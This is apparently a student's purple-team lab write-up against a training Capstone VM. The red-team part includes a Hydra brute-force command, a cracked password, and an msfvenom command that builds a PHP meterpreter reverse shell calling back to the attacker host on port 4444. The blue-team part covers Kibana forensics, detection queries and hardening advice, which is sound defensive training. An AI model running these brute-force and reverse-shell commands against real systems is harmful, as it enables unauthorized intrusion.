# Purple Teaming

Monitoring Setup Instructions

As I attack the webserver I need to make sure that my Elastic Stack is recording my activity.

I start by launching the Elastic Stack and Kibana on my monitoring server:


#### Filebeat Setup:

##### Commands Used:

```bash
filebeat modules enable apache
```

```bash
filebeat setup
```

![filebeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/filebeat_setup.png)


#### Metricbeat Setup:

##### Commands Used:


```bash
metricbeat modules enable apache
```

```bash
metricbeat setup
```

![metrcibeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/metricbeat_setup.png)


#### Packetbeat Setup:

##### Commands Used:

```bash
packetbeat setup
```

Commands used to restart all 3 services:

```bash
systemctl restart filebeat
```
```bash
systemctl restart metricbeat
```
```bash
systemctl restart packetbeat
```


## Red Team Engagement

Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone Virtual Machine.

### The following tools will be used for this red team engagement:

- Firefox
- Hydra
- Nmap
- John the Ripper
- Metasploit
- curl
- MSVenom


Now it's time to search for the webserver that I am looking to attack.

### Below, the `nmap` command I used to discover the IP address of the Linux web server and have all IPs discovered saved into the file `nmap_scanned_ips`:

```bash
nmap -sn 192.168.0.0/24 | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
```

From the list of IPs that Nmap has discovered on my virtual private network:

![nmap_scanned_ips](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_scanned_ips.png)


I then run a service scan on all IPs except the IP of my Kali VM machine (192.168.1.90):


![nmap_webserver_nmap_lookup](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_webserver_nmap_lookup.png)


I found the Linux Apache webserver I was looking for with the IP address `192.168.1.105` on port `80`.

Next, I open a web browser to access the webserver:

![webserver_webdirectory](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webserver_web_directory.png)


### Next, I am tasked with finding a secret folder and break into it. I used Firefox to navigate to the address of the webserver and start my reconnaissance work.

After reading the company's blog I found a lead on the location of the secret folder:

> 192.168.1.105/company_folder/company_culture/file1.txt

![secret_folder_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_clue.png)

Next, in the "meet our team" section I found an interesting text file with a clue about who is in charge of the folder. His name is Ashton:

> 192.168.1.105/meet_our_team/ashton.txt

![secret_folder_admin_ashton](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_admin_ashton.png)


### Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.

I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:

```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```

![hydra_brute_forced_password](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/hydra_brute_forced_passwd.png)

Next, I use Ashton's credentials to acces the 'secret_folder'. I found a note that he left to himself, detailing how to connect to the company's webdav server:

> 192.168.1.105/company_folders/secret_folder/connect_to_corp_server

![ashton_instruction_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/ashton_instructions_connect_webdav.png)


I noticed that a hash for ryan's account is displayed on the page. I decided to use the 'Crack Station' website to crack it. It was successful and I obtained what seems to be a password, i.e., `linux4u`.

![crack_station_cracked_hash](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/Crack_station_cracked_hash.png)


Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address (current address of the webserver 192.168.1.105) of their server and successfully accessed the login window and authenticated with the cracked credentials   `Ryan:linux4u` (i.e., Username: `Ryan` and password: `linux4u`).

![enter_pass_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/enter_pass_webdav.png)

**Successfully logged in:**

![webdav_success_access](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webdav_success_access.png)


### Following the successful connection to the Webdav server, I dropped a PHP reverse Shell payload to gain remote access.

I used `msfvenom` to create my payload file named `exploit.php` with the following command:

```bash
/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
```

![php_payload_creation](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/php_payload_creation.png)


Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:

![copy_paste_exploitPHP_in_webdav](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/copy_paste_exploitPHP_in_webdav.png)



# Blue Team Forensics


## Identifying the offensive traffic


A considerable amount of data is available in the logs. Upon inspection, I was able to identify the malicious traffic and activity generated by my attacking machine.
Through the log inspection, I was able to obtain the following evidence of malicious activity:

- Traffic between my attacking VM and target VM, more specifically, the unusually high volume of requests
- Acces to the 'secret_folder' directory
- The brute force attack against the HTTP server
- The POST request corresponding to the upload of the 'exploit.php' file

Below, the unusually high volume of requests and failed responses between my attacking VM and the target:


![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan.png)

**The requests were made from the IP address `192.168.1.90`.**

![identifying_port_scan](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/identifying_port_scan_2.png)

![error_vs_success_transac](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_attack_error_vs_successful_transac.png)

I can see that the port scan I performed using `nmap` was logged which shows that the interaction between the attacker and the target machines occured on Sep 15, 2021 @ 02:55:00.


- What responses did the victim send back?

Since I know when the interaction between my attacking machine and the target machine occured, I set the date and time to Sep 15, 2021 @ 02:55:00 and refresh my "HTTP Status Codes For The Top Queries" dashboard. Next, I looked at the top responses that the target machine sent back from my dashboard. The codes returned are `401`, `301`, `200`, `403`, `204`:

![responses_sent_back_by_victim](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/responses_sent_back_by_victim.png)


## Finding the request for the hidden directory

### Access to sensitive data:

107,601 requests were made to the hidden directory 'secret_folder'. between Sep 15, 2021 @ 02:55:00 and Sep 15, 2021 @ 03:12:00


![requested_file_report](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/requested_file_report.png)

Below, the additional requests made after the successful brute force attack, i.e., the attacker successfully gaining access to the 'secret_folder/'. The attacker accessed the folder **6** times out of **107,601** attempts.


### HTTP brute force attack

When searching for the `url.path` "/company_folders/secret_folder/", I found the evidence of the HTTP brute force attack allowing me access to the 'secret_folder' during the red team engagement. I was also able to find clues that `Hydra` was used for the brute force attack by looking at the section `user_agent.original`:

![brute_force_hydra_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/brute_force_Hydra_clue.png)



- What kind of alarm would you set to detect this behavior in the future?

We can set an alert each time someone accesses the `secret_folder`.

- Identify at least one way to harden the vulnerable machine that would mitigate this attack.

Since this folder is not meant to be accessible to the public, it should not be on a server that has an open connection to the internet.


### Identify the brute force attack.

After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:

- Can you identify packets specifically from Hydra?

Yes, while searching for the `GET` queries for the `/company_folders/secret_folder` I noticed that the field `user_agent.original` has the value "Mozilla/4.0 (Hydra)".

![brute_force_hydra_clue]


Next, to filter out packets specifically from Hydra, I used the following query:

```
user_agent.original : *Hydra*
```



- How many requests were made in the brute-force attack? How many requests had the attacker made before discovering the correct password in this one?

107,601 brute force attack requests were made. And out of these only 2 were successful (the file inside was accessed twice).


![brute_force_attack_request]

Take a look at the HTTP status codes for the top queries [Packetbeat] ECS panel:

![brute_force_attack_error_code_chart]

You can see on this panel the breakdown of 401 Unauthorized status codes as opposed to 200 OK status codes.


We can also see the spike in both traffic to the server and error codes.


We can see a connection spike in the Connections over time [Packetbeat Flows] ECS


![brute_force_attack_connections_overtime]

We can also see a spike in errors in the Errors vs successful transactions [Packetbet] ECS

![brute_force_attack_error_vs_successful_transac]

These are all results generated by the brute force attack with Hydra.


- What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?

I would set an alert for `401 Unauthorized` (meaning Unauthenticated) is returned from any server. I would start with a threshold at 10 in one hour and refine it to exclude forgotten passwords.

I would also add an alert if the `user_agent.original` value includes "Hydra" in the name.


- Identify at least one way to harden the vulnerable machine that would mitigate this attack.


 ===========  REPHRASES + look for MORE MITIGATIONS =============

 After the limit of 10 401 Unauthorized codes have been returned from a server, that server can automatically drop traffic from the offending IP address for a period of 1 hour. We could also display a lockout message and lock the page from login for a temporary period of time from that user.

===========  REPHRASES + look for MORE MITIGATIONS =============


4. ### Find the WebDav Connection

How many requests were made to this directory?

We can see that 51,253 requests were made to this directory. We also have the requests count made to its sub-folders.

![webdav_directory_requests]



#### Which file(s) were requested?

We can see the passwd.dav file was requested as well as "lib" and "exploit.php", which is our malicious file.


#### What kind of alarm would you set to detect such access in the future?


We can restrict the access to the machine to selected machines and create an alert when other machines get access to the folder.


#### Identify at least one way to harden the vulnerable machine that would mitigate this attack.


- Connections to this shared folder should not be accessible from the web interface.


- Connections to this shared folder could be restricted by machine with a firewall rule.


5. ## Identify the Reverse Shell and meterpreter Traffic


To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:

##### Can you identify traffic from the meterpreter session?


First, we can see the `exploit.php` file in the webdav directory on the Top 10 HTTP requests [Packetbeat] ECS panel.


![webdav_directory_request]


 =================== Remember that your meterpreter session ran over port 4444. Port 4444 is the default port used for meterpreter and the port used in all of their documentation. Because of this, many attackers forget to change this port when conducting an attack. You can construct a search query to find these packets.

 ==============================================

 ![meterpreter_ID_traffic_query]



#### What kinds of alarms would you set to detect this behavior in the future?


We can set an alert for any traffic moving over port 4444.

We can set an alert for any .php file that is uploaded to a server.


#### Identify at least one way to harden the vulnerable machine that would mitigate this attack.

Removing the ability to upload files to this directory over the web interface would take care of this issue.

